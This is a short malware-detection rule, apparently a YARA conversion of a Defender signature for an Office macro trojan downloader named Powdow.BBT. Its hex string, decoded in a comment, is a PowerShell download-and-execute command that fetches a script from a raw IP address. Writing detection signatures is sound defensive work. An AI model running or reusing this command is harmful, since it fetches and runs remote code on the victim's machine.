
rule TrojanDownloader_O97M_Powdow_BBT_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.BBT!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 01 00 "
		
	strings :
		$a_01_0 = {49 45 58 20 28 4e 65 77 2d 4f 62 6a 65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 53 74 72 69 6e 67 28 27 68 74 74 70 3a 2f 2f 31 33 38 2e 32 30 31 2e 31 34 39 2e 34 33 2f 31 4b 61 75 66 76 65 72 74 72 61 67 36 38 32 2f 61 73 2e 70 73 31 27 29 22 2c 20 30 26 2c 20 30 26 2c 20 31 26 2c 20 4e 4f 52 4d 41 4c 5f 50 52 49 4f 52 49 54 59 5f 43 4c 41 53 53 2c 20 30 26 2c 20 30 26 2c 20 73 74 61 72 74 2c 20 70 72 6f 63 29 } //00 00  IEX (New-Object Net.WebClient).DownloadString('http://138.201.149.43/1Kaufvertrag682/as.ps1')", 0&, 0&, 1&, NORMAL_PRIORITY_CLASS, 0&, 0&, start, proc)
	condition:
		any of ($a_*)
 
}